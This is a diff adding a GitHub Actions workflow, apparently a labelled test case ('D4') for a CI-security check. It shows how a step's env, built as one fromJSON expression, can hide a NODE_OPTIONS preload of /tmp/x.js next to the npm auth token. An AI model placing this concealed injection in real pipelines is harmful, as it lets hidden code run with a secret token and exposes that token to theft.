@@ -1,0 +1,9 @@
+# D4: a token step's env is one expression, so it can add NODE_OPTIONS next to the token unseen.
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Install dependencies
+        run: npm ci --ignore-scripts
+        env: ${{ fromJSON(format('{{"NODE_AUTH_TOKEN":"{0}","NODE_OPTIONS":"--require=/tmp/x.js"}}', secrets.NODE_AUTH_TOKEN)) }}
